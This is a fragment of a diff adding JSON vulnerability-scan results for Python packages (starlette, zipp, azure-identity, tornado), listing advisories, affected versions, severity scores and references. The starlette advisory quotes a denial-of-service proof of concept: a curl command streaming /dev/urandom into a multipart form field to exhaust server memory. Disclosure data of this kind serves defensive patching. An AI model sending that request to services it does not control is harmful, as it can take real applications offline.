+              "details": "### Summary\nStarlette treats `multipart/form-data` parts without a `filename` as text form fields and buffers those in byte strings with no size limit. This allows an attacker to upload arbitrary large form fields and cause Starlette to both slow down significantly due to excessive memory allocations and copy operations, and also consume more and more memory until the server starts swapping and grinds to a halt, or the OS terminates the server process with an OOM error. Uploading multiple such requests in parallel may be enough to render a service practically unusable, even if reasonable request size limits are enforced by a reverse proxy in front of Starlette.\n\n### PoC\n\n```python\nfrom starlette.applications import Starlette\nfrom starlette.routing import Route\n\nasync def poc(request):\n    async with request.form():\n        pass\n\napp = Starlette(routes=[\n    Route('/', poc, methods=[\"POST\"]),\n])\n```\n\n```sh\ncurl http://localhost:8000 -F 'big=\u003c/dev/urandom'\n```\n\n### Impact\nThis Denial of service (DoS) vulnerability affects all applications built with Starlette (or FastAPI) accepting form requests.\n",
+              "affected": [
+                {
+                  "package": {
+                    "ecosystem": "PyPI",
+                    "name": "starlette",
+                    "purl": "pkg:pypi/starlette"
+                  },
+                  "ranges": [
+                    {
+                      "type": "ECOSYSTEM",
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "0.40.0"
+                        }
+                      ]
+                    }
+                  ],
+                  "versions": [
+                    "0.1.0",
+                    "0.1.1",
+                    "0.1.10",
+                    "0.1.11",
+                    "0.1.12",
+                    "0.1.13",
+                    "0.1.14",
+                    "0.1.15",
+                    "0.1.16",
+                    "0.1.17",
+                    "0.1.2",
+                    "0.1.3",
+                    "0.1.4",
+                    "0.1.5",
+                    "0.1.6",
+                    "0.1.7",
+                    "0.1.8",
+                    "0.1.9",
+                    "0.10.0",
+                    "0.10.1",
+                    "0.10.2",
+                    "0.10.3",
+                    "0.10.4",
+                    "0.10.5",
+                    "0.10.6",
+                    "0.10.7",
+                    "0.11.0",
+                    "0.11.1",
+                    "0.11.2",
+                    "0.11.3",
+                    "0.11.4",
+                    "0.12.0",
+                    "0.12.0b1",
+                    "0.12.0b2",
+                    "0.12.0b3",
+                    "0.12.1",
+                    "0.12.10",
+                    "0.12.11",
+                    "0.12.12",
+                    "0.12.13",
+                    "0.12.2",
+                    "0.12.3",
+                    "0.12.4",
+                    "0.12.5",
+                    "0.12.6",
+                    "0.12.7",
+                    "0.12.8",
+                    "0.12.9",
+                    "0.13.0",
+                    "0.13.1",
+                    "0.13.2",
+                    "0.13.3",
+                    "0.13.4",
+                    "0.13.5",
+                    "0.13.6",
+                    "0.13.7",
+                    "0.13.8",
+                    "0.14.0",
+                    "0.14.1",
+                    "0.14.2",
+                    "0.15.0",
+                    "0.16.0",
+                    "0.17.0",
+                    "0.17.1",
+                    "0.18.0",
+                    "0.19.0",
+                    "0.19.1",
+                    "0.2.0",
+                    "0.2.1",
+                    "0.2.2",
+                    "0.2.3",
+                    "0.20.0",
+                    "0.20.1",
+                    "0.20.2",
+                    "0.20.3",
+                    "0.20.4",
+                    "0.21.0",
+                    "0.22.0",
+                    "0.23.0",
+                    "0.23.1",
+                    "0.24.0",
+                    "0.25.0",
+                    "0.26.0",
+                    "0.26.0.post1",
+                    "0.26.1",
+                    "0.27.0",
+                    "0.28.0",
+                    "0.29.0",
+                    "0.3.0",
+                    "0.3.1",
+                    "0.3.2",
+                    "0.3.3",
+                    "0.3.4",
+                    "0.3.5",
+                    "0.3.6",
+                    "0.3.7",
+                    "0.30.0",
+                    "0.31.0",
+                    "0.31.1",
+                    "0.32.0",
+                    "0.32.0.post1",
+                    "0.33.0",
+                    "0.34.0",
+                    "0.35.0",
+                    "0.35.1",
+                    "0.36.0",
+                    "0.36.1",
+                    "0.36.2",
+                    "0.36.3",
+                    "0.37.0",
+                    "0.37.1",
+                    "0.37.2",
+                    "0.38.0",
+                    "0.38.1",
+                    "0.38.2",
+                    "0.38.3",
+                    "0.38.4",
+                    "0.38.5",
+                    "0.38.6",
+                    "0.39.0",
+                    "0.39.1",
+                    "0.39.2",
+                    "0.4.0",
+                    "0.4.1",
+                    "0.4.2",
+                    "0.5.0",
+                    "0.5.1",
+                    "0.5.2",
+                    "0.5.3",
+                    "0.5.4",
+                    "0.5.5",
+                    "0.6.0",
+                    "0.6.1",
+                    "0.6.2",
+                    "0.6.3",
+                    "0.7.0",
+                    "0.7.1",
+                    "0.7.2",
+                    "0.7.3",
+                    "0.7.4",
+                    "0.8.0",
+                    "0.8.1",
+                    "0.8.2",
+                    "0.8.3",
+                    "0.8.4",
+                    "0.8.5",
+                    "0.8.6",
+                    "0.8.7",
+                    "0.8.8",
+                    "0.9.0",
+                    "0.9.1",
+                    "0.9.10",
+                    "0.9.11",
+                    "0.9.2",
+                    "0.9.3",
+                    "0.9.4",
+                    "0.9.5",
+                    "0.9.6",
+                    "0.9.7",
+                    "0.9.8",
+                    "0.9.9"
+                  ],
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/10/GHSA-f96h-pmfr-66vw/GHSA-f96h-pmfr-66vw.json"
+                  }
+                }
+              ],
+              "severity": [
+                {
+                  "type": "CVSS_V3",
+                  "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:N"
+                },
+                {
+                  "type": "CVSS_V4",
+                  "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N"
+                }
+              ],
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/encode/starlette/security/advisories/GHSA-f96h-pmfr-66vw"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-47874"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/encode/starlette/commit/fd038f3070c302bff17ef7d173dbb0b007617733"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/encode/starlette"
+                }
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-770"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2024-10-15T18:12:57Z",
+                "nvd_published_at": "2024-10-15T16:15:05Z",
+                "severity": "HIGH"
+              }
+            }
+          ],
+          "groups": [
+            {
+              "ids": [
+                "GHSA-f96h-pmfr-66vw"
+              ],
+              "aliases": [
+                "CVE-2024-47874",
+                "GHSA-f96h-pmfr-66vw"
+              ],
+              "max_severity": "8.7"
+            }
+          ]
+        },
+        {
+          "package": {
+            "name": "zipp",
+            "version": "3.18.1",
+            "ecosystem": "PyPI"
+          },
+          "vulnerabilities": [
+            {
+              "modified": "2024-07-09T17:42:36Z",
+              "published": "2024-07-09T00:31:40Z",
+              "schema_version": "1.6.0",
+              "id": "GHSA-jfmj-5v4g-7637",
+              "aliases": [
+                "CVE-2024-5569"
+              ],
+              "related": [
+                "CGA-69gm-mrf8-5mj6",
+                "CGA-7gxw-gx69-9qpc",
+                "CGA-fvpq-c5rc-92h6"
+              ],
+              "summary": "zipp Denial of Service vulnerability",
+              "details": "A Denial of Service (DoS) vulnerability exists in the jaraco/zipp library, affecting all versions prior to 3.19.1. The vulnerability is triggered when processing a specially crafted zip file that leads to an infinite loop. This issue also impacts the zipfile module of CPython, as features from the third-party zipp library are later merged into CPython, and the affected code is identical in both projects. The infinite loop can be initiated through the use of functions affecting the `Path` module in both zipp and zipfile, such as `joinpath`, the overloaded division operator, and `iterdir`. Although the infinite loop is not resource exhaustive, it prevents the application from responding. The vulnerability was addressed in version 3.19.1 of jaraco/zipp.",
+              "affected": [
+                {
+                  "package": {
+                    "ecosystem": "PyPI",
+                    "name": "zipp",
+                    "purl": "pkg:pypi/zipp"
+                  },
+                  "ranges": [
+                    {
+                      "type": "ECOSYSTEM",
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "3.19.1"
+                        }
+                      ]
+                    }
+                  ],
+                  "versions": [
+                    "0.1.0",
+                    "0.2.0",
+                    "0.2.1",
+                    "0.3.0",
+                    "0.3.1",
+                    "0.3.2",
+                    "0.3.3",
+                    "0.4.0",
+                    "0.5.0",
+                    "0.5.1",
+                    "0.5.2",
+                    "0.6.0",
+                    "1.0.0",
+                    "1.1.0",
+                    "1.1.1",
+                    "1.2.0",
+                    "2.0.0",
+                    "2.0.1",
+                    "2.1.0",
+                    "2.2.0",
+                    "2.2.1",
+                    "3.0.0",
+                    "3.1.0",
+                    "3.10.0",
+                    "3.11.0",
+                    "3.12.0",
+                    "3.12.1",
+                    "3.13.0",
+                    "3.14.0",
+                    "3.15.0",
+                    "3.16.0",
+                    "3.16.1",
+                    "3.16.2",
+                    "3.17.0",
+                    "3.18.0",
+                    "3.18.1",
+                    "3.18.2",
+                    "3.19.0",
+                    "3.2.0",
+                    "3.3.0",
+                    "3.3.1",
+                    "3.3.2",
+                    "3.4.0",
+                    "3.4.1",
+                    "3.4.2",
+                    "3.5.0",
+                    "3.5.1",
+                    "3.6.0",
+                    "3.7.0",
+                    "3.8.0",
+                    "3.8.1",
+                    "3.9.0",
+                    "3.9.1"
+                  ],
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/07/GHSA-jfmj-5v4g-7637/GHSA-jfmj-5v4g-7637.json"
+                  }
+                }
+              ],
+              "severity": [
+                {
+                  "type": "CVSS_V3",
+                  "score": "CVSS:3.0/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+                },
+                {
+                  "type": "CVSS_V4",
+                  "score": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N"
+                }
+              ],
+              "references": [
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-5569"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/jaraco/zipp/commit/fd604bd34f0343472521a36da1fbd22e793e14fd"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/jaraco/zipp"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://huntr.com/bounties/be898306-11f9-46b4-b28c-f4c4aa4ffbae"
+                }
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-400"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2024-07-09T17:25:54Z",
+                "nvd_published_at": "2024-07-09T00:15:02Z",
+                "severity": "MODERATE"
+              }
+            }
+          ],
+          "groups": [
+            {
+              "ids": [
+                "GHSA-jfmj-5v4g-7637"
+              ],
+              "aliases": [
+                "CVE-2024-5569",
+                "GHSA-jfmj-5v4g-7637"
+              ],
+              "max_severity": "6.9"
+            }
+          ]
+        },
+        {
+          "package": {
+            "name": "azure-identity",
+            "version": "1.12.0",
+            "ecosystem": "PyPI"
+          },
+          "vulnerabilities": [
+            {
+              "modified": "2024-07-15T22:27:04Z",
+              "published": "2024-06-11T18:30:50Z",
+              "schema_version": "1.6.0",
+              "id": "GHSA-m5vv-6r4h-3vj9",
+              "aliases": [
+                "CVE-2024-35255",
+                "GO-2024-2918"
+              ],
+              "related": [
+                "CGA-22v2-fxwf-9fr6",
+                "CGA-239r-c5f9-fpfj",
+                "CGA-23qm-339g-q5rq",
+                "CGA-24w3-c8cq-57qw",
+                "CGA-2692-hcq7-xjm8",
+                "CGA-28v8-7f8r-m9ww",
+                "CGA-295j-75j3-84vw",
+                "CGA-2cm4-vpc6-pv3j",
+                "CGA-2jpc-9pc4-35x9",
+                "CGA-2p8f-mv2m-8p2g",
+                "CGA-2q47-7rqc-rvpr",
+                "CGA-2r8r-8pf9-93p6",
+                "CGA-2whj-v58w-p3cw",
+                "CGA-2xfh-qmgq-vx5v",
+                "CGA-33cm-cxfp-hq9x",
+                "CGA-35qq-v4x7-g8hr",
+                "CGA-3gfh-xg79-64rx",
+                "CGA-3hgh-xw5g-q968",
+                "CGA-3mg9-gppp-p5xg",
+                "CGA-42mp-vp7j-m293",
+                "CGA-46jv-359v-37c2",
+                "CGA-48qh-3cmx-x3q7",
+                "CGA-4c8h-55mj-27g9",
+                "CGA-4cp8-v8x9-xf65",
+                "CGA-4g9m-vv8j-hw69",
+                "CGA-4gf6-v2x3-r55p",
+                "CGA-4hfg-7vmx-9jvw",
+                "CGA-4q6g-7c97-xpcc",
+                "CGA-525c-q846-rphh",
+                "CGA-562h-vqjm-ghfg",
+                "CGA-56xw-wjg8-j46r",
+                "CGA-5f2c-7cjw-vfxg",
+                "CGA-5hj9-rjqf-qcxc",
+                "CGA-5ppx-hc8c-fq3g",
+                "CGA-5qxp-943m-6pf3",
+                "CGA-5rw9-rrmv-pmfr",
+                "CGA-5xwc-hffc-phx4",
+                "CGA-63vw-p545-47gm",
+                "CGA-67hg-88j4-hpq8",
+                "CGA-6ppc-7w2f-hw86",
+                "CGA-6w2h-93jf-xf67",
+                "CGA-73qv-xhj6-j54c",
+                "CGA-7c7g-h9fv-q8j3",
+                "CGA-7f7r-5pp2-5g35",
+                "CGA-7g64-4rrc-2xmx",
+                "CGA-7qrr-xjp6-fjxm",
+                "CGA-7w94-v262-g4jv",
+                "CGA-84mf-6w7v-xpm3",
+                "CGA-87rr-22r2-g8x6",
+                "CGA-8mj5-qc52-76qf",
+                "CGA-8qw6-v3xw-qphj",
+                "CGA-8x4m-9598-h9g4",
+                "CGA-8xqf-2j7q-9gjw",
+                "CGA-925c-qrgr-37xp",
+                "CGA-94wr-fc7q-9496",
+                "CGA-96hr-8566-xc9j",
+                "CGA-98x5-2cwf-6r85",
+                "CGA-9932-7qxv-xj4w",
+                "CGA-99j2-2p96-3v6m",
+                "CGA-9mpm-96vr-8v53",
+                "CGA-9q5x-f9q6-j52q",
+                "CGA-9qh2-h2gh-qp89",
+                "CGA-9qwr-q2wh-qfvf",
+                "CGA-9x78-w7v8-whxf",
+                "CGA-c7cv-4x3g-mg7h",
+                "CGA-c8q8-c29m-7vmq",
+                "CGA-f2q2-cx8f-c86p",
+                "CGA-f42v-9vqh-cg28",
+                "CGA-f697-72xm-6h8m",
+                "CGA-f7gg-hgq4-hpf4",
+                "CGA-f87j-mwwr-p28x",
+                "CGA-fcv3-88m9-wp7j",
+                "CGA-ff6m-2686-9x3m",
+                "CGA-frrf-2vc3-mfr3",
+                "CGA-g7v9-vhpv-q43g",
+                "CGA-g9xv-mrf3-2jx9",
+                "CGA-h77w-v467-3cxg",
+                "CGA-h92v-4jxh-fr55",
+                "CGA-h96h-jwq9-2843",
+                "CGA-h97j-j3cx-2f23",
+                "CGA-hfq8-fhqg-qhqx",
+                "CGA-hjwx-8794-hj5w",
+                "CGA-hqvj-7964-g4jg",
+                "CGA-hvcv-mvpr-vc77",
+                "CGA-j3pv-xcfg-x4gc",
+                "CGA-jq77-vh5j-x3gh",
+                "CGA-m5m3-54c5-23rr",
+                "CGA-mc8m-44p5-273h",
+                "CGA-mf3v-prm8-j3gq",
+                "CGA-mg58-x2gv-pr6r",
+                "CGA-mhr5-mm59-g9v8",
+                "CGA-mpvw-q85f-chh9",
+                "CGA-mwp3-p76c-m3qq",
+                "CGA-p3w2-7jg8-hqrq",
+                "CGA-p5hj-4w5m-gvwp",
+                "CGA-p95p-m854-8783",
+                "CGA-p9mr-h84j-x2p6",
+                "CGA-pgfm-3gq9-vjmg",
+                "CGA-pvqw-fpfq-xh69",
+                "CGA-q5w3-f5vm-g9m3",
+                "CGA-q643-mc95-9f4f",
+                "CGA-q662-93cq-rqr3",
+                "CGA-q6c6-rcxj-5fmh",
+                "CGA-q97p-h56j-m4fv",
+                "CGA-qv5p-9m82-733m",
+                "CGA-r82q-hw76-gmrc",
+                "CGA-r84x-fv23-6q9m",
+                "CGA-rgv3-wg25-j59v",
+                "CGA-rm3q-73jc-4q9m",
+                "CGA-rq8w-587r-f9pm",
+                "CGA-rqxq-m4c2-x9ph",
+                "CGA-v3cj-jgcv-jmhw",
+                "CGA-v6vj-gm26-7r8p",
+                "CGA-vfm9-cgcj-prvp",
+                "CGA-vhj2-vrq8-mm67",
+                "CGA-vw5v-7qhc-9gg5",
+                "CGA-vw6g-89v3-x8pv",
+                "CGA-w34q-7mx6-527r",
+                "CGA-w6v8-wcmv-cfjx",
+                "CGA-wcmr-gjcv-ccpm",
+                "CGA-wqxh-m97h-j5f6",
+                "CGA-wwww-fc3r-f74g",
+                "CGA-wx3h-6vhc-mqpv",
+                "CGA-x3fq-g96j-xmjq",
+                "CGA-x6c3-p37f-phhf",
+                "CGA-x8q8-gpj4-r44c",
+                "CGA-xcg6-jg76-p7wq",
+                "CGA-xcmv-3hxx-7m2v",
+                "CGA-xj36-3hv3-chh7",
+                "CGA-xj6j-5vv8-pjv3",
+                "CGA-xvjv-2jwr-6897",
+                "CGA-xvp5-g73c-c5j4"
+              ],
+              "summary": "Azure Identity Libraries and Microsoft Authentication Library Elevation of Privilege Vulnerability",
+              "details": "Azure Identity Libraries and Microsoft Authentication Library Elevation of Privilege Vulnerability.",
+              "affected": [
+                {
+                  "package": {
+                    "ecosystem": "PyPI",
+                    "name": "azure-identity",
+                    "purl": "pkg:pypi/azure-identity"
+                  },
+                  "ranges": [
+                    {
+                      "type": "ECOSYSTEM",
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "1.16.1"
+                        }
+                      ]
+                    }
+                  ],
+                  "versions": [
+                    "1.0.0",
+                    "1.0.0b1",
+                    "1.0.0b2",
+                    "1.0.0b3",
+                    "1.0.0b4",
+                    "1.0.1",
+                    "1.1.0",
+                    "1.10.0",
+                    "1.10.0b1",
+                    "1.11.0",
+                    "1.11.0b1",
+                    "1.11.0b2",
+                    "1.11.0b3",
+                    "1.12.0",
+                    "1.12.0b1",
+                    "1.12.0b2",
+                    "1.13.0",
+                    "1.13.0b1",
+                    "1.13.0b2",
+                    "1.13.0b3",
+                    "1.13.0b4",
+                    "1.14.0",
+                    "1.14.0b1",
+                    "1.14.0b2",
+                    "1.14.1",
+                    "1.15.0",
+                    "1.15.0b1",
+                    "1.15.0b2",
+                    "1.16.0",
+                    "1.16.0b1",
+                    "1.16.0b2",
+                    "1.2.0",
+                    "1.3.0",
+                    "1.3.1",
+                    "1.4.0",
+                    "1.4.0b1",
+                    "1.4.0b2",
+                    "1.4.0b3",
+                    "1.4.0b4",
+                    "1.4.0b5",
+                    "1.4.0b6",
+                    "1.4.0b7",
+                    "1.4.1",
+                    "1.5.0",
+                    "1.5.0b1",
+                    "1.5.0b2",
+                    "1.6.0",
+                    "1.6.0b1",
+                    "1.6.0b2",
+                    "1.6.0b3",
+                    "1.6.1",
+                    "1.7.0",
+                    "1.7.0b1",
+                    "1.7.0b2",
+                    "1.7.0b3",
+                    "1.7.0b4",
+                    "1.7.1",
+                    "1.8.0",
+                    "1.8.0b1",
+                    "1.9.0",
+                    "1.9.0b1"
+                  ],
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/06/GHSA-m5vv-6r4h-3vj9/GHSA-m5vv-6r4h-3vj9.json"
+                  }
+                },
+                {
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "@azure/identity",
+                    "purl": "pkg:npm/%40azure/identity"
+                  },
+                  "ranges": [
+                    {
+                      "type": "SEMVER",
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "4.2.1"
+                        }
+                      ]
+                    }
+                  ],
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/06/GHSA-m5vv-6r4h-3vj9/GHSA-m5vv-6r4h-3vj9.json"
+                  }
+                },
+                {
+                  "package": {
+                    "ecosystem": "Maven",
+                    "name": "com.azure:azure-identity",
+                    "purl": "pkg:maven/com.azure/azure-identity"
+                  },
+                  "ranges": [
+                    {
+                      "type": "ECOSYSTEM",
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "1.12.2"
+                        }
+                      ]
+                    }
+                  ],
+                  "versions": [
+                    "1.0.0",
+                    "1.0.0-preview.1",
+                    "1.0.0-preview.2",
+                    "1.0.0-preview.3",
+                    "1.0.0-preview.4",
+                    "1.0.0-preview.5",
+                    "1.0.1",
+                    "1.0.2",
+                    "1.0.3",
+                    "1.0.4",
+                    "1.0.5",
+                    "1.0.6",
+                    "1.0.7",
+                    "1.0.8",
+                    "1.0.9",
+                    "1.1.0",
+                    "1.1.0-beta.1",
+                    "1.1.0-beta.2",
+                    "1.1.0-beta.3",
+                    "1.1.0-beta.4",
+                    "1.1.0-beta.5",
+                    "1.1.0-beta.6",
+                    "1.1.0-beta.7",
+                    "1.1.1",
+                    "1.1.2",
+                    "1.1.3",
+                    "1.10.0",
+                    "1.10.0-beta.1",
+                    "1.10.1",
+                    "1.10.2",
+                    "1.10.3",
+                    "1.10.4",
+                    "1.11.0",
+                    "1.11.0-beta.1",
+                    "1.11.0-beta.2",
+                    "1.11.1",
+                    "1.11.2",
+                    "1.11.3",
+                    "1.11.4",
+                    "1.12.0",
+                    "1.12.0-beta.1",
+                    "1.12.1",
+                    "1.2.0",
+                    "1.2.0-beta.1",
+                    "1.2.0-beta.2",
+                    "1.2.1",
+                    "1.2.2",
+                    "1.2.3",
+                    "1.2.4",
+                    "1.2.5",
+                    "1.3.0",
+                    "1.3.0-beta.1",
+                    "1.3.0-beta.2",
+                    "1.3.1",
+                    "1.3.2",
+                    "1.3.3",
+                    "1.3.4",
+                    "1.3.5",
+                    "1.3.6",
+                    "1.3.7",
+                    "1.4.0",
+                    "1.4.0-beta.1",
+                    "1.4.1",
+                    "1.4.2",
+                    "1.4.3",
+                    "1.4.4",
+                    "1.4.5",
+                    "1.4.6",
+                    "1.5.0",
+                    "1.5.0-beta.1",
+                    "1.5.0-beta.2",
+                    "1.5.1",
+                    "1.5.2",
+                    "1.5.3",
+                    "1.5.4",
+                    "1.5.5",
+                    "1.6.0",
+                    "1.6.0-beta.1",
+                    "1.6.1",
+                    "1.7.0",
+                    "1.7.0-beta.1",
+                    "1.7.0-beta.2",
+                    "1.7.1",
+                    "1.7.2",
+                    "1.7.3",
+                    "1.8.0",
+                    "1.8.0-beta.1",
+                    "1.8.1",
+                    "1.8.2",
+                    "1.8.3",
+                    "1.9.0",
+                    "1.9.0-beta.1",
+                    "1.9.0-beta.2",
+                    "1.9.0-beta.3",
+                    "1.9.1",
+                    "1.9.2"
+                  ],
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/06/GHSA-m5vv-6r4h-3vj9/GHSA-m5vv-6r4h-3vj9.json"
+                  }
+                },
+                {
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "@azure/msal-node",
+                    "purl": "pkg:npm/%40azure/msal-node"
+                  },
+                  "ranges": [
+                    {
+                      "type": "SEMVER",
+                      "events": [
+                        {
+                          "introduced": "2.7.0"
+                        },
+                        {
+                          "fixed": "2.9.2"
+                        }
+                      ]
+                    }
+                  ],
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/06/GHSA-m5vv-6r4h-3vj9/GHSA-m5vv-6r4h-3vj9.json"
+                  }
+                },
+                {
+                  "package": {
+                    "ecosystem": "NuGet",
+                    "name": "Microsoft.Identity.Client",
+                    "purl": "pkg:nuget/Microsoft.Identity.Client"
+                  },
+                  "ranges": [
+                    {
+                      "type": "ECOSYSTEM",
+                      "events": [
+                        {
+                          "introduced": "4.49.1"
+                        },
+                        {
+                          "fixed": "4.60.4"
+                        }
+                      ]
+                    }
+                  ],
+                  "versions": [
+                    "4.49.1",
+                    "4.50.0",
+                    "4.51.0",
+                    "4.52.0",
+                    "4.53.0",
+                    "4.54.0",
+                    "4.54.1",
+                    "4.55.0",
+                    "4.55.0-TestPackage",
+                    "4.56.0",
+                    "4.57.0",
+                    "4.58.0",
+                    "4.58.1",
+                    "4.59.0",
+                    "4.59.1",
+                    "4.60.0",
+                    "4.60.0-netonly",
+                    "4.60.1",
+                    "4.60.2",
+                    "4.60.3"
+                  ],
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/06/GHSA-m5vv-6r4h-3vj9/GHSA-m5vv-6r4h-3vj9.json"
+                  }
+                },
+                {
+                  "package": {
+                    "ecosystem": "Go",
+                    "name": "github.com/Azure/azure-sdk-for-go/sdk/azidentity",
+                    "purl": "pkg:golang/github.com/Azure/azure-sdk-for-go/sdk/azidentity"
+                  },
+                  "ranges": [
+                    {
+                      "type": "SEMVER",
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "1.6.0"
+                        }
+                      ]
+                    }
+                  ],
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/06/GHSA-m5vv-6r4h-3vj9/GHSA-m5vv-6r4h-3vj9.json"
+                  }
+                },
+                {
+                  "package": {
+                    "ecosystem": "Maven",
+                    "name": "com.microsoft.azure:msal4j",
+                    "purl": "pkg:maven/com.microsoft.azure/msal4j"
+                  },
+                  "ranges": [
+                    {
+                      "type": "ECOSYSTEM",
+                      "events": [
+                        {
+                          "introduced": "1.14.4-beta"
+                        },
+                        {
+                          "fixed": "1.15.1"
+                        }
+                      ]
+                    }
+                  ],
+                  "versions": [
+                    "1.14.4-beta",
+                    "1.15.0"
+                  ],
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/06/GHSA-m5vv-6r4h-3vj9/GHSA-m5vv-6r4h-3vj9.json"
+                  }
+                },
+                {
+                  "package": {
+                    "ecosystem": "NuGet",
+                    "name": "Azure.Identity",
+                    "purl": "pkg:nuget/Azure.Identity"
+                  },
+                  "ranges": [
+                    {
+                      "type": "ECOSYSTEM",
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "1.11.4"
+                        }
+                      ]
+                    }
+                  ],
+                  "versions": [
+                    "1.0.0",
+                    "1.1.0",
+                    "1.1.1",
+                    "1.10.0",
+                    "1.10.1",
+                    "1.10.2",
+                    "1.10.3",
+                    "1.10.4",
+                    "1.11.0",
+                    "1.11.1",
+                    "1.11.2",
+                    "1.11.3",
+                    "1.2.0",
+                    "1.2.1",
+                    "1.2.2",
+                    "1.2.3",
+                    "1.3.0",
+                    "1.4.0",
+                    "1.4.1",
+                    "1.5.0",
+                    "1.6.0",
+                    "1.6.1",
+                    "1.7.0",
+                    "1.8.0",
+                    "1.8.1",
+                    "1.8.2",
+                    "1.9.0"
+                  ],
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/06/GHSA-m5vv-6r4h-3vj9/GHSA-m5vv-6r4h-3vj9.json"
+                  }
+                },
+                {
+                  "package": {
+                    "ecosystem": "NuGet",
+                    "name": "Microsoft.Identity.Client",
+                    "purl": "pkg:nuget/Microsoft.Identity.Client"
+                  },
+                  "ranges": [
+                    {
+                      "type": "ECOSYSTEM",
+                      "events": [
+                        {
+                          "introduced": "4.61.0"
+                        },
+                        {
+                          "fixed": "4.61.3"
+                        }
+                      ]
+                    }
+                  ],
+                  "versions": [
+                    "4.61.0",
+                    "4.61.1",
+                    "4.61.2"
+                  ],
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/06/GHSA-m5vv-6r4h-3vj9/GHSA-m5vv-6r4h-3vj9.json"
+                  }
+                }
+              ],
+              "severity": [
+                {
+                  "type": "CVSS_V3",
+                  "score": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N"
+                },
+                {
+                  "type": "CVSS_V4",
+                  "score": "CVSS:4.0/AV:L/AC:L/AT:N/PR:L/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N"
+                }
+              ],
+              "references": [
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-35255"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/AzureAD/microsoft-authentication-library-for-dotnet/issues/4806#issuecomment-2178960340"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/Azure/azure-sdk-for-go/commit/50774cd9709905523136fb05e8c85a50e8984499"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/Azure/azure-sdk-for-java/commit/5bf020d6ea056de40e2738e3647a4e06f902c18d"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/Azure/azure-sdk-for-js/commit/c6aa75d312ae463e744163cedfd8fc480cc8d492"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/Azure/azure-sdk-for-net/commit/9279a4f38bf69b457cfb9b354f210e0a540a5c53"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/Azure/azure-sdk-for-python/commit/cb065acd7d0f957327dc4f02d1646d4e51a94178"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-35255"
+                }
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-362"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2024-06-11T19:57:01Z",
+                "nvd_published_at": "2024-06-11T17:16:03Z",
+                "severity": "MODERATE"
+              }
+            }
+          ],
+          "groups": [
+            {
+              "ids": [
+                "GHSA-m5vv-6r4h-3vj9"
+              ],
+              "aliases": [
+                "CVE-2024-35255",
+                "GHSA-m5vv-6r4h-3vj9",
+                "GO-2024-2918"
+              ],
+              "max_severity": "6.8"
+            }
+          ]
+        },
+        {
+          "package": {
+            "name": "tornado",
+            "version": "6.4",
+            "ecosystem": "PyPI"
+          },
+          "vulnerabilities": [
+            {
+              "modified": "2024-06-06T21:46:24Z",
+              "published": "2024-06-06T21:41:20Z",
+              "schema_version": "1.6.0",
+              "id": "GHSA-753j-mpmx-qq6g",
